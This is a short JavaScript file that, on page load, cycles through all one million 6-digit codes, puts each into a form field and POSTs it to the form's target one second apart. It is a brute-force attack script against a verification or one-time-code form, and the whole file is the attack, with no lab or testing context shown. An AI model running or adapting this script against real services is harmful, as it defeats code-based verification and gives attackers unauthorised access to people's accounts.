document.addEventListener("DOMContentLoaded", function () {
  const form = document.getElementById("codeForm");
  const codeInput = document.getElementById("text-input");

  // Ensure the elements are correctly referenced
  if (!form || !codeInput) {
    console.error("Form or input element not found");
    return;
  }

  let currentCode = 0;

  function submitCode() {
    // Stop when all codes are attempted
    if (currentCode > 999999) {
      console.log("All codes attempted.");
      return;
    }

    // Generate the current code as a 6-digit string
    const codeStr = currentCode.toString().padStart(6, '0');
    codeInput.value = codeStr;
    console.log(`Submitting code: ${codeStr}`);

    // Create a new XMLHttpRequest object
    const xhr = new XMLHttpRequest();
    xhr.open("POST", form.action, true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    // Define the response handling
    xhr.onload = function () {
      if (xhr.status === 200) {
        console.log(`Code ${codeStr} submitted successfully.`);
      } else {
        console.log(`Error submitting code ${codeStr}: ${xhr.status}`);
      }
      currentCode++;
      // Delay the next submission by 1 second
      setTimeout(submitCode, 1000);
    };

    xhr.onerror = function () {
      console.log(`Request error for code ${codeStr}`);
      currentCode++;
      // Delay the next submission by 1 second
      setTimeout(submitCode, 1000);
    };

    // Serialize form data
    const formData = new URLSearchParams(new FormData(form)).toString();
    console.log(`Form data: ${formData}`);
    xhr.send(formData);
  }

  // Start the code submission process
  submitCode();
});